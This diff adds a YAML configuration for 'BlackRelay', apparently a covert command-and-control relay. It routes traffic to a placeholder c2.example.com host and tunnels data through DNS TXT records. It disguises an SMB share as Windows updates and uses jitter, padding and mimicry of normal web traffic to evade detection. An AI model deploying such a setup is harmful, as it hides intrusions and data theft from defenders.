@@ -1,0 +1,122 @@
+# BlackRelay Configuration
+
+# Node configuration
+node:
+  role: "edge"  # Options: edge, internal, exit
+  id: ""  # Leave blank to auto-generate
+  max_connections: 100
+  connection_timeout: 300  # seconds
+
+# Network settings
+network:
+  listen_address: "0.0.0.0"
+  upstream_servers:
+    - address: "c2.example.com"
+      port: 443
+      type: "https"
+    - address: "ns1.example.com" 
+      port: 53
+      type: "dns"
+
+# Protocol settings
+protocols:
+  http:
+    enabled: true
+    port: 8080
+    path: "/api/data"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+      Accept-Language: "en-US,en;q=0.5"
+    mimicry: "regular_web_traffic"
+    
+  https:
+    enabled: true
+    port: 8443
+    cert_file: "keys/server.crt"
+    key_file: "keys/server.key"
+    verify_cert: false
+    path: "/api/data"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
+    mimicry: "cdn_traffic"
+  
+  dns:
+    enabled: true
+    port: 53
+    domain: "relay.example.com"
+    record_types: ["TXT", "CNAME", "MX"]
+    ttl: 60
+    upstream_dns: "8.8.8.8"
+    chunking: true
+    chunk_size: 40
+    encoding: "base32"
+  
+  icmp:
+    enabled: false  # Requires root privileges
+    identifier: 13370
+    sequence: 10000
+    ttl: 64
+    payload_size: 56
+  
+  tcp_custom:
+    enabled: true
+    port: 8765
+    protocol_signature: "AE0X"
+    encoding: "binary"
+    encryption: "aes256"
+    header_length: 8
+    
+  udp_custom:
+    enabled: false
+    port: 8766
+    protocol_signature: "BF1X" 
+    encoding: "binary"
+    encryption: "aes256"
+    
+  smb:
+    enabled: false
+    share_name: "Updates"
+    folder_path: "WindowsUpdates"
+    poll_interval: 30
+    
+  websocket:
+    enabled: true
+    port: 8767
+    path: "/ws"
+    protocols: ["chat", "binary"]
+    origin_validation: false
+
+# Encryption settings
+encryption:
+  symmetric_algorithm: "AES-256-GCM"
+  asymmetric_algorithm: "RSA-2048"
+  key_exchange: "ECDHE"
+  key_rotation_interval: 86400  # 24 hours in seconds
+  certificate_duration: 30  # days
+  
+# Traffic obfuscation
+obfuscation:
+  enabled: true
+  techniques:
+    - "padding"
+    - "jitter"
+    - "mimicry" 
+  jitter_range: [10, 30]  # percentage
+  padding_max: 512  # bytes
+  
+# Resilience settings
+resilience:
+  retries: 3
+  retry_delay: 5  # seconds
+  circuit_breaker_threshold: 5
+  circuit_breaker_reset: 60  # seconds
+
+# Logging settings
+logging:
+  level: "INFO"  # Options: DEBUG, INFO, WARNING, ERROR, CRITICAL
+  file: "blackrelay.log"
+  max_size: 10485760  # 10MB
+  backups: 5
+  include_timestamps: true
+  rotation: "daily"
